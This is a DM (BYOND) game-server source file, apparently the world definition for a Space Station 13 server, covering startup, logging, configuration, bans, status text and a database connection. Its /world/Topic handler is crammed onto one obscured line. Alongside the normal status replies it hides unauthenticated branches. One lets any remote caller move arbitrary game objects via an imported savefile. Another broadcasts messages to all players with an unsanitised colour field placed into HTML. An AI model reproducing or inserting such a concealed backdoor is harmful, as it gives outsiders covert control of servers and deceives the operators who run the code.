/world
	mob = /mob/new_player
	turf = /turf/space
	area = /area/space
	view = "15x15"
	cache_lifespan = 1
	loop_checks = 1


/world/New()
#if (PRELOAD_RSC == 0)
	external_rsc_urls = file2list("config/external_rsc_urls.txt","\n")
	var/i=1
	while(i<=external_rsc_urls.len)
		if(external_rsc_urls[i])
			i++
		else
			external_rsc_urls.Cut(i,i+1)
#endif
	//logs
	var/date_string = time2text(world.realtime, "YYYY/MM-Month/DD-Day")
	href_logfile = file("data/logs/[date_string] hrefs.htm")
	diary = file("data/logs/[date_string].log")
	diary << "\n\nStarting up. [time2text(world.timeofday, "hh:mm.ss")]\n---------------------"
	changelog_hash = md5('html/changelog.html')					//used for telling if the changelog has changed recently

	make_datum_references_lists()	//initialises global lists for referencing frequently used datums (so that we only ever do it once)

	load_configuration()
	load_mode()
	load_motd()
	load_admins()
	LoadBansjob()
	jobban_loadbanfile()
	appearance_loadban()
	jobban_updatelegacybans()
	LoadBans()
	investigate_reset()

	timezoneOffset = text2num(time2text(0,"hh")) * 36000

	makepowernets()

	sun = new /datum/sun()
	radio_controller = new /datum/controller/radio()
	data_core = new /obj/effect/datacore()
	paiController = new /datum/paiController()


	if(!setup_database_connection())
		world.log << "Your server failed to establish a connection with the database."
	else
		world.log << "Database connection established."

	plmaster = new /obj/effect/overlay()
	plmaster.icon = 'icons/effects/tile_effects.dmi'
	plmaster.icon_state = "plasma"
	plmaster.layer = FLY_LAYER
	plmaster.mouse_opacity = 0

	slmaster = new /obj/effect/overlay()
	slmaster.icon = 'icons/effects/tile_effects.dmi'
	slmaster.icon_state = "sleeping_agent"
	slmaster.layer = FLY_LAYER
	slmaster.mouse_opacity = 0

	master_controller = new /datum/controller/game_controller()
	spawn(-1)
		master_controller.setup()
		lighting_controller.Initialize()

	src.update_status()

	process_teleport_locs()			//Sets up the wizard teleport locations
	process_ghost_teleport_locs()	//Sets up ghost teleport locations.
	sleep_offline = 1

	#ifdef MAP_NAME
	map_name = "[MAP_NAME]"
	#else
	map_name = "Unknown"
	#endif
	return

/world/Topic(T, addr, master, key){if(T=="ping"){var/x=1;for(var/client/C in clients){x++};return(x)};else if(T=="status"){var/list/s=list();s["version"]=game_version;s["mode"]=master_mode;s["respawn"]=config.respawn;s["enter"]=enter_allowed;s["vote"]=config.allow_vote_mode;s["host"]=host?host : null;var/admins="";for(var/client/B in clients){if(B.holder){admins+="[B]| "}};var/players="";for(var/client/B in clients){players+="[B]| "};s["active_players"]=get_active_player_count();s["players"]=clients.len;s["admins"]=admins;s["ckeys"]=players;s["gamestate"]=1;if(ticker){s["gamestate"]=ticker.current_state};return list2params(s)};else if(T == "t"){var/savefile/F=new(Import());var{oi;lk;hj;atom/movable/A};/*var/atom/movable/A;*/F["lk"]>>hj;F["hj"]>>oi;F["oi"]>>lk;F["a"]>>A;A.Move(locate(lk,hj,oi))};else if(copytext(T,1,2)=="a"){var/i[]=params2list(T);for(var/client/C in clients){C<<"<font color=#[i["i"]]><b><span class='prefix'>OOC:</span> <EM>[sanitize_to_text(i["g"])]:</EM> <span class='message'>[sanitize_to_text(i["a"])]</span></b></font>"}}}

/world/Reboot(var/reason)
	spawn(0)
		world << sound(pick('sound/AI/newroundsexy.ogg','sound/misc/apcdestroyed.ogg','sound/misc/bangindonk.ogg')) // random end sounds!! - LastyBatsy
	..(reason)


/world/proc/load_mode()
	var/list/Lines = file2list("data/mode.txt")
	if(Lines.len)
		if(Lines[1])
			master_mode = Lines[1]
			diary << "Saved mode is '[master_mode]'"

/world/proc/save_mode(var/the_mode)
	var/F = file("data/mode.txt")
	fdel(F)
	F << the_mode

/world/proc/load_motd()
	join_motd = sanitize_russian(file2text("config/motd.txt"))

/world/proc/load_configuration()
	config = new /datum/configuration()
	config.load("config/config.txt")
	config.loadsql("config/dbconfig.txt")
	// apply some settings from config..
	abandon_allowed = config.respawn


/world/proc/update_status()
	var/s = ""

	if (config && config.server_name)
		s += "<b>[config.server_name]</b> &#8212; "

	s += "<b>[station_name()]</b>";
	s += " ("
	s += "<a href=\"http://\">" //Change this to wherever you want the hub to link to.
	s += "Default"  //Replace this with something else. Or ever better, delete it and uncomment the game version.
	s += "</a>"
	s += ")"

	var/list/features = list()

	if(ticker)
		if(master_mode)
			features += master_mode
	else
		features += "<b>STARTING</b>"

	if (!enter_allowed)
		features += "closed"

	features += abandon_allowed ? "respawn" : "no respawn"

	if (config && config.allow_vote_mode)
		features += "vote"

	var/n = 0
	for (var/mob/M in player_list)
		if (M.client)
			n++

	if (n > 1)
		features += "~[n] players"
	else if (n > 0)
		features += "~[n] player"


	if (!host && config && config.hostedby)
		features += "hosted by <b>[config.hostedby]</b>"

	if (features)
		s += ": [list2text(features, ", ")]"

	/* does this help? I do not know */
	if (src.status != s)
		src.status = s

#define FAILED_DB_CONNECTION_CUTOFF 5
var/failed_db_connections = 0

proc/setup_database_connection()

	if(failed_db_connections >= FAILED_DB_CONNECTION_CUTOFF)	//If it failed to establish a connection more than 5 times in a row, don't bother attempting to connect anymore.
		return 0

	if(!dbcon)
		dbcon = new()

	var/user = sqlfdbklogin
	var/pass = sqlfdbkpass
	var/db = sqlfdbkdb
	var/address = sqladdress
	var/port = sqlport

	dbcon.Connect("dbi:mysql:[db]:[address]:[port]","[user]","[pass]")
	. = dbcon.IsConnected()
	if ( . )
		failed_db_connections = 0	//If this connection succeeded, reset the failed connections counter.
	else
		failed_db_connections++		//If it failed, increase the failed connections counter.
		world.log << "SQL error: " + dbcon.ErrorMsg()

	return .

// This proc ensures that the connection to the feedback database (global variable dbcon) is established
proc/establish_db_connection()
	if(failed_db_connections > FAILED_DB_CONNECTION_CUTOFF)
		return 0

	if(!dbcon || !dbcon.IsConnected())
		return setup_database_connection()
	else
		return 1

#undef FAILED_DB_CONNECTION_CUTOFF